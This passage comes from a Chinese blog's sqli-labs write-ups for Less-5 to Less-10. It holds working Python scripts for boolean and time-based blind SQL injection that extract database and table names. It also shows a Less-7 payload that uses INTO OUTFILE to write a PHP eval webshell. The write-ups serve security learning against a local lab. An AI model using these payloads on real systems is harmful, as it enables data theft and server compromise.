class="line">					result+=char</span><br><span class="line">					<span class="keyword">print</span> result</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	get_db_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<p>之前好几次CTF比赛上都遇到了这类题目，但是由于当时确实不会这个东西而且嫌麻烦又不想学……脚本跑出来也相当费时…<br>好吧，继续，再列一次表，后面的操作大同小异而已。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	r=requests.session()</span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-9/?id=1' "</span>+payload</span><br><span class="line">	start_time=time.time()</span><br><span class="line">	r.post(url)</span><br><span class="line">	<span class="keyword">if</span> time.time()-start_time &lt;<span class="number">5</span>:</span><br><span class="line">		<span class="comment">#if time don't delay 5 seconds,which means right</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_num</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and if((select count(*) from information_schema.tables where table_schema=database())="</span>+str(i)+<span class="string">",1,sleep(5))%23"</span></span><br><span class="line">		<span class="keyword">if</span>(send_data(payload)):</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"The number of table is"</span>,i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(j)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and if((select length(table_name) from information_schema.tables where table_schema=database() limit "</span>+str(j)+<span class="string">",1)="</span>+str(i)+<span class="string">",1,sleep(5))%23"</span></span><br><span class="line">		<span class="keyword">if</span>(send_data(payload)):</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"The length of table is "</span>,i</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">	chars=<span class="string">".1234567890@abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		result=<span class="string">""</span></span><br><span class="line">		db_length=get_table_length(i)</span><br><span class="line">		<span class="keyword">if</span> db_length != <span class="keyword">None</span>:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(db_length+<span class="number">1</span>):</span><br><span class="line">				<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">					payload=<span class="string">"and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "</span>+str(i)+<span class="string">",1),"</span>+str(j)+<span class="string">",1))="</span>+str(ord(char))+<span class="string">",1,sleep(5))%23"</span></span><br><span class="line">					<span class="keyword">if</span>(send_data(payload)):</span><br><span class="line">						result+=char</span><br><span class="line">						<span class="comment">#print result</span></span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	get_table_num()</span><br><span class="line">	get_db_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/20/5a8be4ecd8d42.jpg" alt=""></p>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p><img src="https://i.loli.net/2018/02/20/5a8b9690df2cd.jpg" alt=""><br>Less-10也是基于时间的盲注，和Less-9的测试方法一样，都是查看元素，不过Less-10是加双引号绕过罢了。<br>脚本参考Less-9即可。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/02/20/sqlilabs-Less8-Less10-writeup/" data-id="cjk0t3vep00199cv4ve5yu9nq" class="article-share-link">Compartir</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL-injection/">SQL_injection</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-sqlilab-Less-7-writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/02/19/sqlilab-Less-7-writeup/" class="article-date">
  <time datetime="2018-02-19T11:19:27.000Z" itemprop="datePublished">2018-02-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞学习/">漏洞学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/19/sqlilab-Less-7-writeup/">sqlilabs Less-7 writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p><img src="https://i.loli.net/2018/02/19/5a8aa02e7df0b.jpg" alt=""><br>这里把Less-7单独放出来，是因为Less-7和Less-5和Less-6的盲注不一样，根据题目的提示“Use outfile”所以这题又涉及到了一些新姿势，首先讲讲基础知识。</p>
<h3 id="1-Load-file-导出文件"><a href="#1-Load-file-导出文件" class="headerlink" title="1.Load_file()导出文件"></a>1.Load_file()导出文件</h3><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。但是有几个条件限制：<br>·需要有读取文件的权限；<br>·需要知道文件的绝对物理路径；<br>·欲读取文件必须小于 max_allowed_packet。<br>在实际的注入中，我们有两个难点需要解决：<br>·绝对物理路径；<br>·构造有效的畸形语句 （报错爆出绝对路径）。<br>我在D盘中创建了一个test.txt文件，进入本机Mysql下进行Load_file()测试。<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows下<span class="keyword">cmd</span><span class="bash">执行命令 ： start mysql</span></span><br><span class="line"><span class="bash">就能弹出Mysql所在文件夹，进入Mysql文件夹下的bin目录，再执行命令：</span></span><br><span class="line"><span class="bash">mysql -u root -p</span></span><br></pre></td></tr></table></figure></p>
<p><img src="" alt=""><br>成功执行命令后取出文件中的值，但是D:/test.txt和D:\test.txt返回值为空。</p>
<h3 id="2-对路径进行编码"><a href="#2-对路径进行编码" class="headerlink" title="2.对路径进行编码"></a>2.对路径进行编码</h3><h4 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h4><p>对D://test.txt进行ASCII编码<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(char(<span class="number">68</span>,<span class="number">58</span>,<span class="number">92</span>,<span class="number">92</span>,<span class="number">84</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">46</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>));</span><br></pre></td></tr></table></figure></p>
<p><img src="" alt=""></p>
<h4 id="Hex编码"><a href="#Hex编码" class="headerlink" title="Hex编码"></a>Hex编码</h4><p>同理，还是对D://test.txt进行Hex编码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="number">0x443A2F2F746573742E747874</span>);</span><br></pre></td></tr></table></figure></p>
<p><img src="" alt=""></p>
<h3 id="3-导入文件-select"><a href="#3-导入文件-select" class="headerlink" title="3.导入文件 select"></a>3.导入文件 select</h3><p>语法：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span></span><br></pre></td></tr></table></figure></p>
<p>测试结果如下：<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">into</span> outfile <span class="string">'D:\\databse_test'</span>;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">into</span> outfile <span class="string">'D:/db_test'</span>;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>注意，文件同名会报错。</p>
<h3 id="4-关于导出失败"><a href="#4-关于导出失败" class="headerlink" title="4.关于导出失败"></a>4.关于导出失败</h3><p>当前台无法导出数据的时候，利用下面的语句：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file('c:<span class="symbol">\\</span>wamp<span class="symbol">\\</span>bin<span class="symbol">\\</span>mysql<span class="symbol">\\</span>mysql5.6.17<span class="symbol">\\</span>my.ini')into outfile 'c:<span class="symbol">\\</span>wamp<span class="symbol">\\</span>www<span class="symbol">\\</span>test.php'</span><br></pre></td></tr></table></figure></p>
<h3 id="5-写入Webshell"><a href="#5-写入Webshell" class="headerlink" title="5.写入Webshell"></a>5.写入Webshell</h3><p>写入Webshell的前提是知道网站的绝对路径，如果display_errors = on，程序就会暴露WEB目录的绝对路径。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select "<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'will'</span>])<span class="meta">?&gt;</span></span>" into outfile 'D:/TEST/webshell.php';</span><br></pre></td></tr></table></figure></p>
<p><img src="" alt=""></p>
<h3 id="6-Less-7-实际操作"><a href="#6-Less-7-实际操作" class="headerlink" title="6.Less-7 实际操作"></a>6.Less-7 实际操作</h3><p>首先对参数id进行测试，利用and 1=1和and 1=2来测试，最后通过’))来绕过，成功绕过以后执行payload写入文件。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-7/?id=1')) union select 1,2,'<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">"will"</span>]) <span class="meta">?&gt;</span></span>' into outfile "D:\\TEST\\less-7.php" %23</span><br></pre></td></tr></table></figure></p>
<p>虽然页面提示“You have an error in your SQL syntax”，但是检查路径以后发现文件确实写入了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/02/19/sqlilab-Less-7-writeup/" data-id="cjk0t3vem00149cv4d1evzmu4" class="article-share-link">Compartir</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL-injection/">SQL_injection</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-sqlilabs-Less-5~6" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/02/19/sqlilabs-Less-5~6/" class="article-date">
  <time datetime="2018-02-19T09:56:35.000Z" itemprop="datePublished">2018-02-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞学习/">漏洞学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/19/sqlilabs-Less-5~6/">sqlilabs Less-5~Less-6 writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><img src="https://i.loli.net/2018/02/19/5a8a70a699cbc.jpg" alt=""><br>诶，我发现这界面配色还挺好看的（打死），有趣了，继续测试，发现加上一个单引号就能绕过。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">5</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>测试出来还是3列，但是无法显列，怎么测试都只有You are in…….这一串字，所以只能是盲注了。<br>盲注分为以下三类：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Booleanbase（普通盲注）</span></span><br><span class="line"><span class="keyword">Timebase（时间盲注）</span></span><br><span class="line"><span class="keyword">Errorbase（基于报错的盲注）</span></span><br></pre></td></tr></table></figure></p>
<p>下面介绍一些关于盲注的函数：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">left</span>（database（），<span class="number">1</span>） 返回 database（）的最左面 <span class="number">1</span> 个字符</span><br><span class="line">length（databse（）） 返回数据库的长度</span><br><span class="line">substr（a，b，c） 从 <span class="selector-tag">b</span> 位置开始，截取字符串 <span class="selector-tag">a</span> 的 c 长度</span><br><span class="line">ascii（） 将某个字符转换为 ascii 值</span><br><span class="line">mid（<span class="selector-tag">a</span>,<span class="selector-tag">b</span>,c）从位置 <span class="selector-tag">b</span> 开始，截取 <span class="selector-tag">a</span> 字符串的 c 位</span><br></pre></td></tr></table></figure></p>
<p>所以这里写了一个脚本来跑数据库的长度<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">main_url</span>=<span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' and length(database())="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,20):</span><br><span class="line">	<span class="attribute">url</span>=main_url+str(i)+"%23"</span><br><span class="line">	<span class="attribute">r</span>=requests.get(url)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"You"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">		<span class="builtin-name">print</span> <span class="string">"The length of database is"</span>,i</span><br><span class="line">		break</span><br></pre></td></tr></table></figure></p>
<p>跑出来当前的结果是数据库长度为8，下面该开始跑数据库名字了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dataset = <span class="string">" abcdefghijklmnopqrstuvwxyz_"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></span><br><span class="line">	url = <span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' "</span>+ payload</span><br><span class="line">	content = requests.get(url).text</span><br><span class="line">	<span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_length</span><span class="params">()</span>:</span></span><br><span class="line">	count = <span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span> count:</span><br><span class="line">		payload = <span class="string">"and length(database())="</span></span><br><span class="line">		payload = payload + str(count) + <span class="string">"%23"</span></span><br><span class="line">		recv = sendPayload(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">			<span class="keyword">return</span> count</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbName</span><span class="params">(length)</span>:</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(length+<span class="number">1</span>):</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> dataset:</span><br><span class="line">					payload=<span class="string">"and left(database(),"</span>+str(k)+<span class="string">")='"</span>+result+j+<span class="string">"'%23"</span></span><br><span class="line">					recv=sendPayload(payload)</span><br><span class="line">					<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">						<span class="keyword">if</span> j !=<span class="string">' '</span>:</span><br><span class="line">							result+=j</span><br><span class="line">							<span class="keyword">print</span> result</span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	length = get_db_length()</span><br><span class="line"> 	<span class="keyword">print</span> <span class="string">"the length of database is "</span>,length</span><br><span class="line"> 	getdbName(length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<p>这里跑出来以后数据库名字是security。<br><img src="https://i.loli.net/2018/02/18/5a898f1700743.jpg" alt=""><br>写完以后参考了一下Chybeta师傅做法以后我发现可以不先跑出数据库的长度，而是先跑出数据库的数量，然后找到需要查询的表再进行查找注入（感觉有点像sqlmap的工作过程？），所以下面上脚本，可以跑出所有数据库的总数和名称。<br>这里放上Chybeta师傅的博客链接：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>chybeta.github.io<span class="regexp">/2017/</span><span class="number">07</span><span class="regexp">/12/</span>Sqli-Labs-Less5-<span class="number">6</span>-writeup<span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">chars=<span class="string">"abcdefghijklmnopqrstuvwxyz_"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' "</span>+payload</span><br><span class="line">	r=requests.get(url).text</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbNum</span><span class="params">()</span>:</span></span><br><span class="line">	cnt=<span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span> cnt:</span><br><span class="line">		payload=<span class="string">"and (select count(*) from information_schema.schemata) ="</span></span><br><span class="line">		payload=payload+str(cnt)+<span class="string">"%23"</span></span><br><span class="line">		text=send_data(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> text:</span><br><span class="line">			<span class="keyword">return</span> cnt</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			cnt+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbName</span><span class="params">(dbNum)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</span><br><span class="line">		cnt=<span class="number">1</span></span><br><span class="line">		result=<span class="string">""</span></span><br><span class="line">		<span class="keyword">while</span> cnt:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">				payload=<span class="string">"and substring((select schema_name from information_schema.schemata limit "</span>+str(k)+<span class="string">",1),"</span>+str(cnt)+<span class="string">",1)='"</span>+j</span><br><span class="line">				text=send_data(payload)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> text:</span><br><span class="line">					<span class="keyword">if</span> j != <span class="string">' '</span>:</span><br><span class="line">						result+=j</span><br><span class="line">						cnt+=<span class="number">1</span></span><br><span class="line">					<span class="keyword">else</span>:</span><br><span class="line">						<span class="keyword">print</span> result</span><br><span class="line">						cnt=<span class="number">0</span></span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	dbNum=getdbNum()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"The number of database is:"</span>,dbNum</span><br><span class="line">	getdbName(dbNum)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>到这里可以说是走出了第一步，已经获取了数据库的名称，现在需要查出表的名称，这里需要使用ascii和substr这两个函数了。<br>获取完整表名有两个步骤：<br>①获取表的长度；<br>②利用ascii码获取单个表字符然后叠加。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' "</span>+payload</span><br><span class="line">	content=requests.get(url).text</span><br><span class="line">	<span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(i)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and (select length(table_name) from information_schema.tables where table_schema=database() limit "</span>+str(i)+<span class="string">",1)="</span>+str(j)+<span class="string">"%23"</span></span><br><span class="line">		<span class="comment">#print payload</span></span><br><span class="line">		recv=get_data(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">			<span class="comment">#print j</span></span><br><span class="line">			<span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_TableName</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		result=<span class="string">""</span></span><br><span class="line">		table_length=get_table_length(i)</span><br><span class="line">		<span class="keyword">if</span> table_length <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="comment">#print table_length</span></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(table_length+<span class="number">1</span>):</span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">122</span>):</span><br><span class="line">				payload=<span class="string">"and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "</span>+str(i)+<span class="string">",1),"</span>+str(j)+<span class="string">",1))="</span>+str(k)+<span class="string">"%23"</span></span><br><span class="line">				recv=get_data(payload)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">					result+=chr(k)</span><br><span class="line">					<span class="keyword">print</span> result</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	get_TableName()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
